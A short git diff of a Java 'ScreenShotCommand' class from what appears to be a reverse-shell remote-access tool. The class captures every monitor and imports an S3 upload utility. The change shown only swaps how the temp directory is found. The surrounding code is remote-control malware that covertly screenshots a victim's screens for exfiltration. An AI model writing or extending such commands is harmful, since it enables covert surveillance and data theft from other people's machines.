@@ -2,6 +2,7 @@ package com.mtattab.reverseshell.service.commands;
 
 import com.mtattab.reverseshell.model.CommandRestOutput;
 import com.mtattab.reverseshell.service.Command;
+import com.mtattab.reverseshell.util.OSUtil;
 import com.mtattab.reverseshell.util.S3UploadUtil;
 
 import javax.imageio.ImageIO;
@@ -44,7 +45,7 @@ public class ScreenShotCommand implements Command {
             BufferedImage screenshot = robot.createScreenCapture(allScreensBounds);
 
             // Determine the temporary directory
-            String tmpDir = System.getProperty("java.io.tmpdir");
+            String tmpDir = OSUtil.getSystemTmpDir();
             File outputFile = new File(tmpDir, fileName);
 
             // Save the multi-monitor screenshot to the temporary directory
